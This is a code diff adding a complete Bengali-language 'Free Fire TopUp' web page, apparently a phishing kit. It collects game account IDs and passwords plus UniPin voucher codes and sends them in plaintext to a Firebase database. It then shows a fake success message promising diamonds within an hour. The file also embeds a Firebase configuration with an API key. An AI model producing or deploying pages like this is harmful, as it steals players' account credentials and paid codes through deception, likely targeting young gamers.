@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire TopUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #1e1e1e;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #ff9800;
+        }
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background-color: #2c2c2c;
+            color: white;
+            font-size: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #ff9800;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff9800;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        button:hover {
+            background-color: #e68a00;
+        }
+        .package-card {
+            background-color: #2c2c2c;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .package-card:hover {
+            border-color: #ff9800;
+            background-color: #383838;
+        }
+        .package-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .package-price {
+            color: #ff9800;
+        }
+        .success-icon {
+            font-size: 50px;
+            color: #4caf50;
+            margin-bottom: 15px;
+        }
+        p {
+            line-height: 1.5;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- 1. Login Page -->
+        <div id="login-page" class="page active">
+            <h2>লগইন করুন</h2>
+            <p style="margin-bottom: 20px;">আপনার গেম একাউন্ট আইডি এবং পাসওয়ার্ড দিন</p>
+            <input type="text" id="accountId" placeholder="Account ID" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="handleLogin()">লগইন</button>
+        </div>
+
+        <!-- 2. Packages Page -->
+        <div id="packages-page" class="page">
+            <h2>প্যাকেজ নির্বাচন করুন</h2>
+            
+            <div class="package-card" onclick="selectPackage('1 Month Membership')">
+                <div class="package-title">1 Month Membership</div>
+                <div class="package-price">Free Fire</div>
+            </div>
+            
+            <div class="package-card" onclick="selectPackage('Weekly Membership')">
+                <div class="package-title">Weekly Membership</div>
+                <div class="package-price">Free Fire</div>
+            </div>
+            
+            <div class="package-card" onclick="selectPackage('100 Diamonds')">
+                <div class="package-title">100 Diamonds</div>
+                <div class="package-price">Free Fire</div>
+            </div>
+
+            <div class="package-card" onclick="selectPackage('520 Diamonds')">
+                <div class="package-title">520 Diamonds</div>
+                <div class="package-price">Free Fire</div>
+            </div>
+        </div>
+
+        <!-- 3. Unipin Page -->
+        <div id="unipin-page" class="page">
+            <h2>পেমেন্ট করুন</h2>
+            <p id="selected-package-name" style="margin-bottom: 20px; color: #ff9800; font-weight: bold;"></p>
+            <p style="margin-bottom: 20px;">অনুগ্রহ করে আপনার ইউনিপিন (UniPin) কোডটি নিচে দিন</p>
+            <input type="text" id="unipinCode" placeholder="Enter UniPin Code" required>
+            <button onclick="submitOrder()">কনফার্ম করুন</button>
+        </div>
+
+        <!-- 4. Success Page -->
+        <div id="success-page" class="page">
+            <div class="success-icon">✔️</div>
+            <h2 style="color: #4caf50;">কনগ্রাচুলেশন!</h2>
+            <br>
+            <p>আপনার টপআপটি কমপ্লিট হয়েছে।<br>এক ঘন্টার মধ্যে আপনার অ্যাকাউন্টে ডায়মন্ডটি চলে যাবে।</p>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        // Your Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAEBrWDMiEGuqQGvA4197ljLcvtQk_i43Y",
+            authDomain: "one-tool01.firebaseapp.com",
+            databaseURL: "https://one-tool01-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "one-tool01",
+            storageBucket: "one-tool01.firebasestorage.app",
+            messagingSenderId: "546992530595",
+            appId: "1:546992530595:web:77bf6c3fe2438b3c980b16",
+            measurementId: "G-GMNCXBV0J1"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Data Storage Variables
+        let userData = {
+            accountId: '',
+            password: '',
+            package: '',
+            unipinCode: ''
+        };
+
+        // Function to switch between "Pages"
+        function showPage(pageId) {
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // Step 1: Handle Login Form
+        function handleLogin() {
+            const accId = document.getElementById('accountId').value;
+            const pass = document.getElementById('password').value;
+
+            if(accId.trim() === '' || pass.trim() === '') {
+                alert("দয়া করে আপনার একাউন্ট আইডি এবং পাসওয়ার্ড দিন!");
+                return;
+            }
+
+            // Save details to variable
+            userData.accountId = accId;
+            userData.password = pass;
+
+            // Move to package selection
+            showPage('packages-page');
+        }
+
+        // Step 2: Handle Package Selection
+        function selectPackage(packageName) {
+            userData.package = packageName;
+            document.getElementById('selected-package-name').innerText = "প্যাকেজ: " + packageName;
+            
+            // Move to Unipin page
+            showPage('unipin-page');
+        }
+
+        // Step 3: Handle Unipin and Save to Database
+        function submitOrder() {
+            const upCode = document.getElementById('unipinCode').value;
+
+            if(upCode.trim() === '') {
+                alert("দয়া করে ইউনিপিন কোডটি দিন!");
+                return;
+            }
+
+            userData.unipinCode = upCode;
+
+            // Generate unique Order ID
+            const orderId = "ORDER_" + Date.now();
+            
+            // Send data to Firebase Realtime Database
+            database.ref('topup_orders/' + orderId).set({
+                accountId: userData.accountId,
+                password: userData.password,
+                selectedPackage: userData.package,
+                unipinCode: userData.unipinCode,
+                timestamp: new Date().toLocaleString()
+            }).then(() => {
+                // Success: Show the final page
+                showPage('success-page');
+            }).catch((error) => {
+                alert("সার্ভার এরর, আবার চেষ্টা করুন: " + error.message);
+            });
+        }
+    </script>
+</body>
+</html>
